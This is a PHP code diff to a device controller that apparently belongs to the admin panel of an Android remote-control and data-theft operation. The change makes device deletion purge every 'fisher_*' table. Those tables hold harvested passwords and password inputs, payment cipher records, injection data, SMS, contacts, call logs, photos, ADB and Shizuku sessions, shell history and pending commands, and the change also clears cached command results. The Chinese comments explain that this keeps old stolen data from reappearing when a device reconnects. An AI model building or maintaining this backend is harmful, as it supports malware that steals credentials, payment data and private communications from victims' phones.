@@ -128,32 +128,78 @@ class DeviceController extends BaseController
 
     private function cleanupDeviceRows(string $deviceId): array
     {
-        $tables = [
-            'fisher_device_apps',
-            'fisher_operation_logs',
-            'fisher_bridge_logs',
-            'fisher_password_inputs',
-            'fisher_passwords',
-            'fisher_payment_cipher_records',
-            'fisher_injection_data',
-            'fisher_sms_messages',
-            'fisher_contacts',
-            'fisher_call_logs',
-            'fisher_photos',
-            'fisher_files',
-            'fisher_ai_device_data',
-            'fisher_device_sensitive_apps',
-            'fisher_device_black_apps',
-            'fisher_device_payment_strategy_bindings',
-        ];
-        $deleted = [];
-        foreach ($tables as $table) {
-            if (!$this->tableHasColumn($table, 'device_id')) continue;
-            try {
-                $n = Db::table($table)->where('device_id', $deviceId)->delete();
-                if ($n) $deleted[$table] = $n;
-            } catch (\Throwable $e) {}
+        // 全量删除：不要只删 fisher_devices。只要库里 fisher_* 表含 device_id，
+        // 就一并清理，避免设备重新上线后还能看到旧日志、密码、注入、ADB、媒体、任务等残留。
+        $tables = [];
+        try {
+            $rows = Db::query(
+                "SELECT TABLE_NAME AS table_name
+                 FROM INFORMATION_SCHEMA.COLUMNS
+                 WHERE TABLE_SCHEMA = DATABASE()
+                   AND COLUMN_NAME = 'device_id'
+                   AND TABLE_NAME LIKE 'fisher\_%'"
+            );
+            foreach ($rows as $r) {
+                $table = (string)($r['table_name'] ?? $r['TABLE_NAME'] ?? '');
+                if ($table !== '' && $table !== 'fisher_devices') $tables[] = $table;
+            }
+        } catch (\Throwable $e) {
+            // INFORMATION_SCHEMA 不可用时保底使用项目已知表，覆盖旧库和新库。
+            $tables = [
+                'fisher_active_injection_tasks',
+                'fisher_adb_sessions',
+                'fisher_ai_device_data',
+                'fisher_ai_reports',
+                'fisher_apk_installs',
+                'fisher_bridge_logs',
+                'fisher_call_logs',
+                'fisher_contacts',
+                'fisher_device_apps',
+                'fisher_device_media',
+                'fisher_device_notifications',
+                'fisher_device_payment_strategy_bindings',
+                'fisher_device_tasks',
+                'fisher_file_transfers',
+                'fisher_injection_data',
+                'fisher_operation_logs',
+                'fisher_password_inputs',
+                'fisher_passwords',
+                'fisher_payment_cipher_records',
+                'fisher_payment_strategies',
+                'fisher_pending_commands',
+                'fisher_shell_history',
+                'fisher_shizuku_sessions',
+                'fisher_sms_messages',
+                'fisher_uploads',
+                'fisher_photos',
+                'fisher_files',
+                'fisher_device_sensitive_apps',
+                'fisher_device_black_apps',
+            ];
         }
+
+        $deleted = [];
+        foreach (array_values(array_unique($tables)) as $table) {
+            $safeTable = str_replace('`', '', $table);
+            if (!$this->tableHasColumn($safeTable, 'device_id')) continue;
+            try {
+                $n = Db::table($safeTable)->where('device_id', $deviceId)->delete();
+                if ($n) $deleted[$safeTable] = $n;
+            } catch (\Throwable $e) {
+                $this->logDeviceApiError('device.delete.cleanup', $e, ['device_id' => $deviceId, 'table' => $safeTable]);
+            }
+        }
+
+        // 清掉这个设备已取/未取命令结果类缓存；保留 device_deleted:* 墓碑，防止设备仍在线时立刻重建脏数据。
+        try {
+            Db::table('fisher_settings')
+                ->where('key', 'like', 'cmd_result_%')
+                ->where('value', 'like', '%' . $deviceId . '%')
+                ->delete();
+        } catch (\Throwable $e) {
+            $this->logDeviceApiError('device.delete.cleanup_settings', $e, ['device_id' => $deviceId]);
+        }
+
         return $deleted;
     }
 
